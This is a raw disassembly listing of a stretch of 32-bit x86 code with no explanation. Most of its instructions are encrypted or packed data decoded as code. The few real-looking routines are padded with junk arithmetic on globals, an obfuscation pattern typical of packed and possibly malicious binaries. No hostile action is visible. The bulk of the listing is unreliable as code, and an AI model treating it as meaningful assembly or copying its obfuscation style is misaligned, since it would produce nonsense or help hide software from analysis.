  407220:	popa   
  407221:	sbb    dl,ah
  407223:	(bad)  
  407224:	lock iret 
  407226:	mov    dh,0xc0
  407228:	sub    BYTE PTR [ebx+0x36],al
  40722b:	push   edi
  40722c:	pop    ecx
  40722d:	pushf  
  40722e:	aas    
  40722f:	test   cl,0xd4
  407232:	dec    ecx
  407233:	cwde   
  407234:	in     eax,dx
  407235:	mov    eax,0xd7acfd45
  40723a:	pop    edx
  40723b:	inc    ecx
  40723c:	int    0x2c
  40723e:	xor    dl,BYTE PTR [ecx]
  407240:	jecxz  0x407217
  407242:	stc    
  407243:	jae    0x4072ab
  407245:	fwait
  407246:	pusha  
  407247:	dec    edi
  407248:	gs pop ebx
  40724a:	jbe    0x407297
  40724c:	sub    edi,esp
  40724e:	jno    0x40727e
  407250:	cld    
  407251:	dec    ebp
  407252:	jle    0x4072b7
  407254:	(bad)  
  407255:	sbb    eax,0xce3033e3
  40725a:	bound  esp,QWORD PTR [ecx+ecx*1]
  40725d:	mov    bh,0xbf
  40725f:	nop
  407260:	cdq    
  407261:	pop    ebx
  407262:	aam    0xb9
  407264:	inc    esp
  407265:	push   esi
  407266:	sub    al,0xc7
  407268:	mov    ch,0xf
  40726a:	fsub   QWORD PTR [eax]
  40726c:	jmp    0xc7d6:0x3e559f8b
  407273:	xchg   DWORD PTR [esi+ebx*8+0x4a5ed84f],edx
  40727a:	shl    BYTE PTR [edx+0x7d],cl
  40727d:	in     al,0x5d
  40727f:	lea    edi,[eax]
  407281:	cwde   
  407282:	sbb    bl,al
  407284:	lods   al,BYTE PTR ds:[esi]
  407285:	cmp    bh,BYTE PTR [ebx]
  407287:	inc    ebp
  407288:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407289:	les    ecx,FWORD PTR [edx]
  40728b:	mov    bl,0x56
  40728d:	lock mov cl,0xc6
  407290:	mov    WORD PTR [ecx+esi*4-0x29382907],ds
  407297:	adc    BYTE PTR gs:0xc5a65583,al
  40729e:	enter  0x575a,0xe4
  4072a2:	xchg   esp,eax
  4072a3:	mov    ebp,DWORD PTR [edx+0x6]
  4072a6:	fbstp  TBYTE PTR ds:0xef17dae7
  4072ac:	cwde   
  4072ad:	pop    ecx
  4072ae:	sub    edx,DWORD PTR [edx]
  4072b0:	xchg   ecx,eax
  4072b1:	enter  0x3ec,0x8d
  4072b5:	pop    ebx
  4072b6:	mov    eax,ds:0x48e00160
  4072bb:	std    
  4072bc:	mov    ds:0x8500ffc6,al
  4072c1:	ret    
  4072c2:	xchg   esp,eax
  4072c3:	dec    esp
  4072c4:	or     al,0x34
  4072c6:	into   
  4072c7:	les    eax,FWORD PTR [edx]
  4072c9:	lock (bad) 
  4072cb:	push   DWORD PTR [edi-0x5e5e836f]
  4072d1:	cwde   
  4072d2:	mov    ebx,DWORD PTR [esi+0x5d]
  4072d5:	jl     0x40732b
  4072d7:	cmp    eax,0x230b8637
  4072dc:	mov    ebx,edx
  4072de:	mov    bh,0x53
  4072e0:	mov    edx,0xc18a5ae4
  4072e5:	cdq    
  4072e6:	add    DWORD PTR [ebx],0xffffffd5
  4072e9:	mov    ds:0x3c1c7778,eax
  4072ee:	ret    0x246
  4072f1:	sar    DWORD PTR [edx-0x5f601223],1
  4072f7:	(bad)  
  4072f8:	loopne 0x407366
  4072fa:	dec    ebx
  4072fb:	ins    BYTE PTR es:[edi],dx
  4072fc:	cmp    BYTE PTR [edx+0x15],bh
  4072ff:	jle    0x4072f4
  407301:	ja     0x40730d
  407303:	jae    0x407300
  407305:	aas    
  407306:	jmp    0xb1d2:0x86c72de5
  40730d:	xchg   BYTE PTR [esp+ebp*8-0x73],ch
  407311:	mov    ds:0x720fc40a,eax
  407316:	mov    ds:0x19ca7f1,eax
  40731b:	add    al,0xbf
  40731d:	mov    al,ds:0xe4fffc94
  407322:	or     ch,BYTE PTR [esi+0x7f89ac57]
  407328:	push   esi
  407329:	nop
  40732a:	into   
  40732b:	pop    ss
  40732c:	dec    edi
  40732d:	pop    ebp
  40732e:	push   0x73853c71
  407333:	xor    BYTE PTR [eax+ebx*2-0x2f3cbbb8],ch
  40733a:	ja     0x407392
  40733c:	ja     0x407345
  40733e:	mov    gs,WORD PTR [ebx+0x5b]
  407341:	out    0x10,eax
  407343:	repz inc ecx
  407345:	sub    DWORD PTR [eax],esi
  407347:	mov    eax,DWORD PTR [ebp-0xc]
  40734a:	add    DWORD PTR ds:0x42fc51,0x42e683
  407354:	xor    eax,esi
  407356:	add    DWORD PTR ds:0x42fc7d,0x57f6
  407360:	add    eax,edi
  407362:	xor    DWORD PTR ds:0x42e68f,0x2a11
  40736c:	mov    DWORD PTR [ebp-0x18],eax
  40736f:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  407376:	mov    BYTE PTR [ebp-0x1],0x67
  40737a:	and    DWORD PTR ds:0x42fc7d,0x0
  407384:	mov    eax,ds:0x42fc7d
  407389:	inc    eax
  40738a:	mov    ds:0x42fc7d,eax
  40738f:	cmp    DWORD PTR ds:0x42fc7d,0xe
  407396:	jne    0x4073a2
  40739c:	call   DWORD PTR ds:0x42e3df
  4073a2:	cmp    DWORD PTR ds:0x42fc7d,0xd
  4073a9:	jne    0x4073ba
  4073af:	mov    eax,ds:0x42fc7d
  4073b4:	inc    eax
  4073b5:	mov    ds:0x42fc7d,eax
  4073ba:	cmp    DWORD PTR ds:0x42fc7d,0x1d
  4073c1:	jb     0x407384
  4073c7:	mov    eax,DWORD PTR [ebp-0xc]
  4073ca:	xor    eax,esi
  4073cc:	and    DWORD PTR ds:0x42e0a8,0xdb
  4073d6:	add    eax,edi
  4073d8:	or     DWORD PTR ds:0x42e687,0x71a5
  4073e2:	mov    DWORD PTR [ebp-0x18],eax
  4073e5:	adc    eax,0x7137
  4073ea:	jmp    0x407737
  4073ef:	or     DWORD PTR ds:[edi],eax
  4073f2:	(bad)  
  4073f3:	rcl    edx,cl
  4073f5:	cmp    DWORD PTR [ecx],edx
  4073f7:	pop    ecx
  4073f8:	jns    0x4073c5
  4073fa:	popa   
  4073fb:	std    
  4073fc:	in     al,dx
  4073fd:	pop    ax
  4073ff:	test   edi,0x7d207070
  407405:	jo     0x407477
  407407:	cli    
  407408:	enter  0x8a3a,0xf
  40740c:	pop    eax
  40740d:	in     al,0xe
  40740f:	jns    0x40739d
  407411:	or     DWORD PTR [edx+0x3a3cbecf],eax
  407417:	mov    ebx,DWORD PTR [edi+0x73]
  40741a:	and    BYTE PTR [ecx-0x25],0xae
  40741e:	jne    0x4073b2
  407420:	xor    BYTE PTR ds:0x3b8056c1,cl
  407426:	and    esp,DWORD PTR [esi+0x63]
  407429:	les    ebx,FWORD PTR [ebp+0x4db69c90]
  40742f:	cld    
  407430:	pop    ebp
  407431:	cs xchg esp,eax
  407433:	in     al,0xa1
  407435:	adc    al,0x5a
  407437:	mov    ecx,0xe85acc94
  40743c:	inc    eax
  40743d:	(bad)  
  40743e:	sbb    DWORD PTR [ecx+0x4c619c3a],esi
  407444:	push   esi
  407445:	repz mul DWORD PTR [edx+ebx*1+0x77d58812]
  40744d:	loop   0x4073e9
  40744f:	enter  0xe7fd,0x4a
  407453:	(bad)  
  407454:	ret    
  407455:	jle    0x407481
  407457:	adc    eax,0xd754d49c
  40745c:	icebp  
  40745d:	jg     0x407488
  40745f:	push   eax
  407460:	(bad)  
  407461:	fsubr  QWORD PTR [edx+edx*2]
  407464:	add    BYTE PTR [ecx+0x13835c7a],dl
  40746a:	fs or  DWORD PTR es:[ecx+esi*8],eax
  40746f:	(bad)  
  407470:	sub    BYTE PTR [edi-0x26b1da37],0x10
  407477:	xchg   DWORD PTR [esi+eiz*1],esi
  40747a:	sar    DWORD PTR fs:[esi],1
  40747d:	add    BYTE PTR [edx+0xf],cl
  407480:	(bad)  
  407481:	leave  
  407482:	or     ecx,0xffffffc2
  407485:	xlat   BYTE PTR ds:[ebx]
  407486:	fcomp  DWORD PTR [ebx-0x46ff9ebf]
  40748c:	popf   
  40748d:	adc    al,0x4f
  40748f:	outs   dx,DWORD PTR ds:[esi]
  407490:	sbb    ebp,DWORD PTR [esi]
  407492:	mov    ebp,DWORD PTR [ebp+0x7edf0de0]
  407498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407499:	loope  0x407499
  40749b:	xor    al,0x29
  40749d:	das    
  40749e:	push   edx
  40749f:	mov    eax,ds:0xb0c22139
  4074a4:	cmovns ecx,DWORD PTR [ebp-0x6]
  4074a8:	repnz enter 0x4d95,0xe9
  4074ad:	push   ebp
  4074ae:	sahf   
  4074af:	mov    bl,0x40
  4074b1:	sub    dh,BYTE PTR [eax+0x61]
  4074b4:	imul   esp,DWORD PTR ds:0xd82c36f7,0x3e
  4074bb:	fsubr  QWORD PTR [esi-0x67]
  4074be:	jb     0x407488
  4074c0:	les    eax,FWORD PTR [eax+0x16c29615]
  4074c6:	adc    bl,BYTE PTR [edi-0x7c]
  4074c9:	imul   DWORD PTR [edx+0x7f]
  4074cc:	mov    ebp,esp
  4074ce:	test   BYTE PTR [edx],0x1e
  4074d1:	mov    cl,BYTE PTR [ecx+0x2da9ef1c]
  4074d7:	mov    ecx,DWORD PTR [ecx+eiz*4]
  4074da:	rcr    BYTE PTR [eax+0xba61975],0xe3
  4074e1:	jl     0x4074e3
  4074e3:	add    DWORD PTR [eax],esp
  4074e5:	je     0x40747f
  4074e7:	ins    BYTE PTR es:[edi],dx
  4074e8:	sahf   
  4074e9:	push   ecx
  4074ea:	cmp    al,bl
  4074ec:	dec    ebx
  4074ed:	jno    0x407530
  4074ef:	and    BYTE PTR [edi+0x1c80455a],al
  4074f5:	mov    cs,WORD PTR [edx+0x1c9108c7]
  4074fb:	xchg   ebx,eax
  4074fc:	test   DWORD PTR [edx+0x249c3ef2],esi
  407502:	outs   dx,DWORD PTR ds:[esi]
  407503:	sar    DWORD PTR [ecx+0x73],0x5b
  407507:	(bad)  
  407508:	sbb    edi,DWORD PTR [edi+0x5e]
  40750b:	sahf   
  40750c:	pop    ss
  40750d:	ins    DWORD PTR es:[edi],dx
  40750e:	out    0x7f,al
  407510:	das    
  407511:	neg    BYTE PTR [edi+0x5f]
  407514:	outs   dx,DWORD PTR ds:[esi]
  407515:	cdq    
  407516:	sbb    esi,edi
  407518:	popa   
  407519:	mov    esi,0xd0438917
  40751e:	push   ds
  40751f:	cmp    edx,DWORD PTR [edx-0x2d]
  407522:	out    dx,eax
  407523:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407524:	int3   
  407525:	xor    BYTE PTR [edx+0x1],bh
  407528:	adc    DWORD PTR [esi-0x5f],eax
  40752b:	js     0x4074de
  40752d:	mov    ds:0x220a55d7,eax
  407532:	sahf   
  407533:	test   al,0x82
  407535:	repnz and eax,0x601dcc64
  40753b:	add    al,0xed
  40753d:	xor    BYTE PTR [ebx+0x12],ah
  407540:	jp     0x407531
  407542:	sub    al,0xdb
  407544:	out    dx,eax
  407545:	aas    
  407546:	mov    al,ds:0x9eefca97
  40754b:	dec    ecx
  40754c:	jecxz  0x407549
  40754e:	mov    ah,0x41
  407550:	inc    esi
  407551:	aaa    
  407552:	aaa    
  407553:	(bad)  
  407554:	nop
  407555:	xor    al,0x46
  407557:	loope  0x4074e2
  407559:	push   ss
  40755a:	xchg   ebp,eax
  40755b:	push   es
  40755c:	mov    bl,0xa3
  40755e:	mov    edi,0xb6c95387
  407563:	les    edx,FWORD PTR [ecx+0x4735e34b]
  407569:	mov    ds:0xac552741,eax
  40756e:	gs shr eax,0x0
  407572:	jecxz  0x40753e
  407574:	push   esi
  407575:	mov    fs,WORD PTR [ebp+0x14]
  407578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407579:	jo     0x407595
  40757b:	push   ecx
  40757c:	(bad)  
  40757d:	stos   DWORD PTR es:[edi],eax
  40757e:	int3   
  40757f:	call   0x63f3ee69
  407584:	push   esi
  407585:	adc    edx,DWORD PTR [eax-0x2a]
  407588:	daa    
  407589:	test   DWORD PTR [edi-0x2ef2993e],0xb177be49
  407593:	push   ebx
  407594:	(bad)  
  407596:	shl    BYTE PTR ss:0xf76a598b,1
  40759d:	outs   dx,DWORD PTR ds:[esi]
  40759e:	push   ds
  40759f:	adc    BYTE PTR ds:0x948856dc,dl
  4075a5:	inc    ebp
  4075a6:	dec    esp
  4075a7:	and    DWORD PTR [esi+0x13],0xf2dd7869
  4075ae:	fidiv  WORD PTR [esi+edx*1]
  4075b1:	nop
  4075b2:	lods   eax,DWORD PTR ds:[esi]
  4075b3:	test   eax,0x6f8280e5
  4075b8:	lea    esi,[ebp+0x70]
  4075bb:	cli    
  4075bc:	les    esp,FWORD PTR [ebx-0x15]
  4075bf:	xchg   ecx,eax
  4075c0:	dec    edx
  4075c1:	cdq    
  4075c2:	std    
  4075c3:	hlt    
  4075c4:	adc    BYTE PTR [ebp+0x3f36bec4],bl
  4075ca:	and    dh,BYTE PTR [eax+ebp*4+0x7f66f94]
  4075d1:	les    eax,FWORD PTR [edx+eax*4]
  4075d4:	add    ah,al
  4075d6:	jp     0x407585
  4075d8:	jbe    0x407585
  4075da:	fmulp  st(0),st
  4075dc:	aaa    
  4075dd:	push   esi
  4075de:	test   esi,esp
  4075e0:	add    DWORD PTR [edx],edx
  4075e2:	and    DWORD PTR [ecx],edx
  4075e4:	loop   0x40759a
  4075e6:	aam    0xb4
  4075e8:	in     eax,0xa9
  4075ea:	out    dx,eax
  4075eb:	dec    ecx
  4075ec:	iret   
  4075ed:	cmp    eax,0x96751f2c
  4075f2:	inc    edx
  4075f3:	cwde   
  4075f4:	fld    QWORD PTR [ecx-0x23]
  4075f7:	push   ecx
  4075f8:	xlat   BYTE PTR ds:[bx]
  4075fa:	jp     0x4075b3
  4075fc:	imul   ebp,DWORD PTR [edi+0x4],0xffffffe4
  407600:	cwde   
  407601:	test   al,0xcd
  407603:	call   0xf11e0e15
  407608:	shl    BYTE PTR [esi-0x28a73a6f],cl
  40760e:	cs nop
  407610:	cs (bad) 
  407613:	cmp    al,0xe9
  407615:	push   es
  407616:	mov    eax,edi
  407618:	jge    0x40762b
  40761a:	arpl   WORD PTR ds:0x78b4c653,dx
  407620:	add    al,0x8e
  407622:	daa    
  407623:	in     eax,dx
  407624:	imul   edx,DWORD PTR [edx],0xfffffff1
  407627:	cdq    
  407628:	out    0xf4,eax
  40762a:	iret   
  40762b:	sbb    edi,DWORD PTR [ebp+0x2f9bc871]
  407631:	mov    BYTE PTR [ecx-0x96eb68e],al
  407637:	fsubp  st(1),st
  407639:	sub    BYTE PTR [ecx+0xc],dh
  40763c:	mov    ebp,0x8837e4ff
  407641:	push   es
  407642:	lock add al,0xd4
  407645:	mov    ?,WORD PTR [ecx]
  407647:	and    BYTE PTR [ebx-0x76],dh
  40764a:	sub    al,0xf2
  40764c:	sub    esi,DWORD PTR [ebx+0x26]
  40764f:	push   esi
  407650:	push   0x42
  407652:	dec    edi
  407653:	sub    edi,edx
  407655:	mov    WORD PTR gs:[ebp+0x6834153],gs
  40765c:	retf   
  40765d:	and    bh,BYTE PTR [ecx]
  40765f:	jp     0x40763a
  407661:	mov    dh,0xbc
  407663:	sahf   
  407664:	jne    0x4075e8
  407666:	pop    ebp
  407667:	cmp    BYTE PTR [edi-0x61],dh
  40766a:	and    al,0x80
  40766c:	daa    
  40766d:	xlat   BYTE PTR ds:[ebx]
  40766e:	daa    
  40766f:	fdiv   QWORD PTR [edi+0x7f]
  407672:	mov    gs,WORD PTR [ebp-0x8]
  407675:	and    eax,0x67916651
  40767a:	sub    BYTE PTR [ebx],dl
  40767c:	push   cs
  40767d:	and    BYTE PTR [edi-0x394533bb],dl
  407683:	cmp    al,0xf7
  407685:	std    
  407686:	cdq    
  407687:	aas    
  407688:	pop    ss
  407689:	in     al,0xed
  40768b:	outs   dx,DWORD PTR ds:[esi]
  40768c:	and    dl,BYTE PTR [ecx-0x54207f5b]
  407692:	into   
  407693:	mov    bl,0xdc
  407695:	jnp    0x40762d
  407697:	and    dl,BYTE PTR [eax+ebp*1-0x7]
  40769b:	add    eax,0x434c286c
  4076a0:	xchg   edi,eax
  4076a1:	push   ecx
  4076a2:	push   edi
  4076a3:	xor    esp,DWORD PTR [ebp-0x30]
  4076a6:	mov    eax,0x6e415b6f
  4076ab:	sub    ebp,ebp
  4076ad:	jp     0x407727
  4076af:	fwait
  4076b0:	xor    bh,BYTE PTR [ebp+0x71]
  4076b3:	inc    ecx
  4076b4:	inc    esi
  4076b5:	jmp    0x5924:0x34e5fc0c
  4076bc:	icebp  
  4076bd:	or     BYTE PTR [esi+ecx*2-0x2a],0x29
  4076c2:	mov    cl,0x33
  4076c4:	or     DWORD PTR [edi],ecx
  4076c6:	out    0x17,al
  4076c8:	dec    ebp
  4076c9:	jl     0x407745
  4076cb:	ins    BYTE PTR es:[edi],dx
  4076cc:	pushf  
  4076cd:	add    eax,0x2b88b920
  4076d2:	lock in eax,dx
  4076d4:	jl     0x407723
  4076d6:	inc    esp
  4076d7:	jp     0x4076c8
  4076d9:	jmp    FWORD PTR [edx]
  4076db:	pop    edx
  4076dc:	cmp    ebp,ebx
  4076de:	add    eax,DWORD PTR [edx]
  4076e0:	shr    DWORD PTR [esi-0x5b4c7f57],cl
  4076e6:	jmp    0x40775d
  4076e8:	xor    bl,ah
  4076ea:	or     DWORD PTR [ebx+ecx*2],ebx
  4076ed:	ins    BYTE PTR es:[edi],dx
  4076ee:	lds    ebp,FWORD PTR [ebx-0x2a3e8798]
  4076f4:	jle    0x40767a
  4076f6:	lock jle 0x4076ea
  4076f9:	fbld   TBYTE PTR [ebp+0x5d30efcd]
  4076ff:	(bad)  
  407700:	cmp    dl,cl
  407702:	sar    BYTE PTR [esi],1
  407704:	out    dx,al
  407705:	mov    bl,0x57
  407707:	call   0x12c5:0x85e7df56
  40770e:	(bad)  
  40770f:	dec    ebx
  407710:	or     cl,BYTE PTR [ebx-0x10]
  407713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407714:	and    BYTE PTR [ebx+0x6709688c],ch
  40771a:	outs   dx,DWORD PTR ds:[esi]
  40771b:	dec    edx
  40771c:	fnstenv [edi-0x18]
  40771f:	jbe    0x40776c
  407721:	adc    DWORD PTR [ecx],eax
  407723:	xchg   ecx,eax
  407724:	xor    BYTE PTR ds:0xcb886296,bl
  40772a:	xchg   edx,eax
  40772b:	leave  
  40772c:	mov    ch,0xfd
  40772e:	pop    es
  40772f:	add    eax,0x173d114
  407734:	dec    dl
  407736:	scas   al,BYTE PTR es:[edi]
  407737:	mov    eax,DWORD PTR [ebp-0x24]
  40773a:	xor    eax,esi
  40773c:	add    eax,edi
  40773e:	adc    DWORD PTR ds:0x42e09c,0x42fc89
  407748:	push   eax
  407749:	inc    eax
  40774a:	mov    eax,DWORD PTR [ebp-0x28]
  40774d:	sbb    DWORD PTR ds:0x42fc51,0x6777
  407757:	xor    eax,esi
  407759:	add    eax,edi
  40775b:	push   eax
  40775c:	mov    eax,DWORD PTR [ebp-0x1c]
  40775f:	or     DWORD PTR ds:0x42e66f,0x4a3f
  407769:	xor    eax,esi
  40776b:	add    DWORD PTR ds:0x42fc71,0x266c
  407775:	add    eax,edi
  407777:	xor    DWORD PTR ds:0x42e68f,0x42e66b
  407781:	push   eax
  407782:	lea    eax,[ebp-0x78]
  407785:	push   eax
  407786:	add    DWORD PTR ds:0x42e67f,0x5eb6
  407790:	push   DWORD PTR [ebp-0xc]
  407793:	adc    DWORD PTR ds:0x42e683,0x2bbb
  40779d:	push   DWORD PTR [ebp-0x14]
  4077a0:	call   0x405e60
  4077a5:	adc    DWORD PTR ds:0x42fc65,0x42fcee
  4077af:	test   eax,eax
  4077b1:	je     0x407e83
  4077b7:	lea    eax,[ebp-0x78]
  4077ba:	sbb    DWORD PTR ds:0x42fd02,0x6660
  4077c4:	push   eax
  4077c5:	mov    eax,DWORD PTR [ebp-0x14]
  4077c8:	jmp    0x407b15
  4077cd:	xlat   BYTE PTR ds:[ebx]
  4077ce:	and    BYTE PTR [eax+eiz*8+0x73],ch
  4077d2:	ins    BYTE PTR es:[edi],dx
  4077d3:	push   ebx
  4077d4:	aaa    
  4077d5:	pop    edx
  4077d6:	push   ecx
  4077d7:	push   ebx
  4077d8:	sahf   
  4077d9:	cmp    al,0x6a
  4077db:	xchg   edx,eax
  4077dc:	les    esp,FWORD PTR [edi+0x207070cc]
  4077e2:	jge    0x407854
  4077e4:	jo     0x407783
  4077e6:	xor    edi,DWORD PTR [esi-0x1]
  4077e9:	pop    esp
  4077ea:	in     al,dx
  4077eb:	push   edi
  4077ec:	or     al,BYTE PTR [edi-0x6a]
  4077ef:	jmp    0x4077c3
  4077f1:	aas    
  4077f2:	mov    DWORD PTR [edi-0x3f],0x7adf7d15
  4077f9:	add    BYTE PTR [eax],0x9d
  4077fc:	(bad)  
  4077fe:	and    bl,BYTE PTR [edi]
  407800:	push   ss
  407801:	clc    
  407802:	jle    0x4077a5
  407804:	adc    ebx,DWORD PTR [ebx+0x4a]
  407807:	mov    ah,0x7d
  40780a:	mov    ah,0x5c
  40780c:	add    DWORD PTR ds:0xa7701cdc,ecx
  407812:	cdq    
  407813:	xor    bl,BYTE PTR [edx+0x18]
  407816:	or     bh,BYTE PTR [edi-0x41920639]
  40781c:	popf   
  40781d:	popf   
  40781e:	xchg   ebp,eax
  40781f:	cmp    BYTE PTR [esi-0x7f881e4f],cl
  407825:	psubd  mm4,QWORD PTR [edx+0x1a]
  407829:	fld    DWORD PTR [ecx-0x625cd5e9]
  40782f:	ins    DWORD PTR es:[edi],dx
  407830:	ins    DWORD PTR es:[edi],dx
  407831:	int3   
  407832:	stc    
  407833:	mov    edi,0x6f242e16
  407838:	mov    al,0x2
  40783a:	push   edi
  40783b:	mov    dh,BYTE PTR ds:0x6c2b6b4c
  407841:	mov    dl,BYTE PTR [esi]
  407843:	jmp    0x96b5f48e
  407848:	xchg   BYTE PTR [edi],dh
  40784a:	mov    dh,BYTE PTR [eax]
  40784c:	stos   BYTE PTR es:[edi],al
  40784d:	call   0xd8ace50d
  407852:	test   BYTE PTR [edi-0x1b],al
  407855:	cli    
  407856:	push   ebp
  407857:	loop   0x40784b
  407859:	mov    esi,0xb2c158ba
  40785e:	mov    esi,0x65fb1977
  407863:	pop    eax
  407864:	shl    BYTE PTR [eax+0x198a45f7],cl
  40786a:	das    
  40786b:	pop    esi
  40786c:	cli    
  40786d:	dec    eax
  40786e:	in     eax,0xdc
  407870:	ret    
  407871:	cdq    
  407872:	scas   eax,DWORD PTR es:[edi]
  407873:	jg     0x4077f9
  407875:	mov    cl,0xd9
  407877:	es (bad) 
  407879:	(bad)  
  40787a:	lods   eax,DWORD PTR ds:[esi]
  40787b:	cmc    
  40787c:	ins    BYTE PTR es:[edi],dx
  40787d:	imul   ebp,ebp,0x5e73a16b
  407883:	lds    ebx,FWORD PTR [ebx+0x23]
  407886:	(bad)  
  407887:	lock and DWORD PTR [esi],ecx
  40788a:	or     eax,0x75a4943b
  40788f:	leave  
  407890:	push   cs
  407891:	jge    0x4078ba
  407893:	xor    eax,0xe3bed1d2
  407898:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407899:	fsubr  QWORD PTR ds:0x70e07361
  40789f:	mov    edx,0xeaa3f71b
  4078a4:	aam    0xfd
  4078a6:	sub    bh,bh
  4078a8:	sub    edx,esi
  4078aa:	test   eax,0x4464a00e
  4078af:	or     edi,DWORD PTR [ebx+0x310b722a]
  4078b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078b6:	fisub  DWORD PTR [edx+0x4]
  4078b9:	cld    
  4078ba:	dec    ecx
  4078bb:	cli    
  4078bc:	mov    edi,0xdc6b40d9
  4078c1:	loop   0x407851
  4078c3:	cmc    
  4078c4:	jno    0x407944
  4078c6:	sbb    BYTE PTR [esi],bh
  4078c8:	fadd   QWORD PTR [edi-0x41]
  4078cb:	xchg   DWORD PTR [edx-0x69cc4f39],edx
  4078d1:	loop   0x40794a
  4078d3:	cmp    BYTE PTR [ecx+0x12],cl
  4078d6:	(bad)
  4078d9:	adc    ebx,esp
  4078db:	shl    BYTE PTR [esi],cl
  4078dd:	push   es
  4078de:	unpckhps xmm0,XMMWORD PTR [edx+ebx*2+0x52eaa374]
  4078e6:	pop    ebp
  4078e7:	int3   
  4078e8:	inc    ebp
  4078e9:	push   0xb09ddf48
  4078ee:	mov    ds:0x7f0c8bc,eax
  4078f3:	jl     0x40787e
  4078f5:	jno    0x40790e
  4078f7:	in     eax,dx
  4078f8:	fwait
  4078f9:	in     eax,0x66
  4078fb:	pushf  
  4078fc:	rcl    DWORD PTR [esi-0x19d03a14],cl
  407902:	(bad)
  407905:	xchg   esp,eax
  407906:	ficom  WORD PTR [esi+ebp*8-0x21]
  40790a:	mov    ah,0xaf
  40790c:	hlt    
  40790d:	jl     0x407921
  40790f:	sar    esi,1
  407911:	push   esi
  407912:	test   BYTE PTR [eax-0x3f],dh
  407915:	or     di,WORD PTR ds:0x2983c9a9
  40791c:	pop    ecx
  40791d:	xchg   ebx,eax
  40791e:	pop    ebx
  40791f:	xchg   edx,eax
  407920:	sub    eax,0x203c1a5e
  407925:	push   edi
  407926:	ret    
  407927:	das    
  407928:	pop    ecx
  407929:	or     eax,DWORD PTR [edx+0x8]
  40792c:	test   DWORD PTR [ebx-0x3f344ed2],0x59484ed4
  407936:	pop    ebx
  407938:	inc    edi
  407939:	inc    edx
  40793a:	sub    DWORD PTR [ebx-0x22],ecx
  40793d:	mov    eax,DWORD PTR [ecx]
  40793f:	in     eax,0x80
  407941:	loopne 0x4079a7
  407943:	inc    esp
  407944:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407945:	loope  0x40796c
  407947:	cdq    
  407948:	fwait
  407949:	mov    ebx,0xbe999bc8
  40794e:	fs aad 0x92
  407951:	je     0x40796c
  407953:	fnstsw WORD PTR [ecx]
  407955:	xor    al,0xda
  407957:	cli    
  407958:	loopne 0x407972
  40795a:	sbb    ah,dl
  40795c:	adc    BYTE PTR [esi-0x7f2f5797],al
  407962:	neg    BYTE PTR [ecx-0x54cbab9e]
  407968:	jnp    0x4079bc
  40796a:	cmp    esp,DWORD PTR [esi-0x3ef5aba1]
  407970:	dec    ebp
  407971:	push   edi
  407972:	dec    ecx
  407973:	ret    
  407974:	shl    BYTE PTR [edi+eax*4],0xd6
  407978:	mov    ecx,DWORD PTR [edx+0x2a]
  40797b:	mov    esp,0x9665e415
  407980:	or     DWORD PTR [ebx+0x72],esi
  407983:	push   edx
  407984:	popf   
  407985:	out    dx,eax
  407986:	hlt    
  407987:	adc    BYTE PTR [ebx+0x2118be4c],dh
  40798d:	and    al,0xcc
  40798f:	aaa    
  407990:	imul   ebp,DWORD PTR [edx+ebp*8+0x62],0x610ab2e4
  407998:	mov    al,0xff
  40799a:	dec    edx
  40799b:	push   esp
  40799c:	shl    dh,1
  40799e:	xor    eax,0x930a90a2
  4079a3:	mov    esi,0x50abc0be
  4079a8:	lea    eax,[ecx+0x4f]
  4079ab:	cwde   
  4079ac:	fs push edx
  4079ae:	call   0xf3a6:0x868b0c9b
  4079b5:	cdq    
  4079b6:	fwait
  4079b7:	cli    
  4079b8:	jl     0x407a2b
  4079ba:	mov    ah,bl
  4079bc:	loopne 0x40798b
  4079be:	pop    edi
  4079bf:	push   esp
  4079c0:	dec    ecx
  4079c1:	loop   0x4079ea
  4079c3:	std    
  4079c4:	lods   al,BYTE PTR ds:[esi]
  4079c5:	jg     0x4079db
  4079c7:	es loope 0x40798c
  4079ca:	xchg   ebx,eax
  4079cb:	pop    esi
  4079cc:	inc    ebp
  4079cd:	rcr    ecx,1
  4079cf:	stos   DWORD PTR es:[edi],eax
  4079d0:	stos   DWORD PTR es:[edi],eax
  4079d1:	int3   
  4079d2:	and    eax,0xd0888acf
  4079d7:	repnz lds edi,FWORD PTR [ecx+0x2b]
  4079db:	repnz inc ecx
  4079dd:	jo     0x4079f7
  4079df:	pop    ebx
  4079e0:	sahf   
  4079e1:	xor    cl,al
  4079e3:	cs push ebp
  4079e5:	mov    edx,DWORD PTR [edi-0x6788914b]
  4079eb:	clc    
  4079ec:	mov    dh,BYTE PTR [edx]
  4079ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079ef:	xor    eax,0xc8980f9d
  4079f4:	sub    eax,DWORD PTR [ebx]
  4079f6:	push   esp
  4079f7:	mov    gs,WORD PTR [ecx-0x62]
  4079fa:	shr    DWORD PTR [edi],0x60
  4079fd:	nop
  4079fe:	adc    eax,0x86bd8931
  407a03:	xchg   BYTE PTR [edi+0x9ca78df],bl
  407a09:	(bad)  
  407a0a:	popf   
  407a0b:	or     BYTE PTR [eax+ecx*2-0x45],ah
  407a0f:	push   esi
  407a10:	mov    BYTE PTR ds:0x1f889a05,0x98
  407a17:	fcompp 
  407a19:	repz ds inc ebp
  407a1c:	pop    ss
  407a1d:	out    dx,al
  407a1e:	int    0x22
  407a20:	adc    bh,BYTE PTR [ecx]
  407a22:	sub    DWORD PTR [esp+ecx*4+0x20],esi
  407a26:	add    dh,BYTE PTR ss:[ebx+0x74d2207d]
  407a2d:	or     esp,DWORD PTR [eax+0x56b3020b]
  407a33:	enter  0x8e77,0x34
  407a37:	dec    edx
  407a38:	addr16 mov dh,0x45
  407a3b:	ficomp WORD PTR ds:0x62804efb
  407a41:	push   esp
  407a42:	push   0x29
  407a44:	mov    ebp,0x81313bff
  407a49:	fsub   QWORD PTR [esi]
  407a4b:	in     eax,0xb6
  407a4d:	inc    edx
  407a4e:	push   ss
  407a4f:	mov    bh,0x2d
  407a51:	add    eax,0xc55cc9c6
  407a56:	mov    esi,0x818ea005
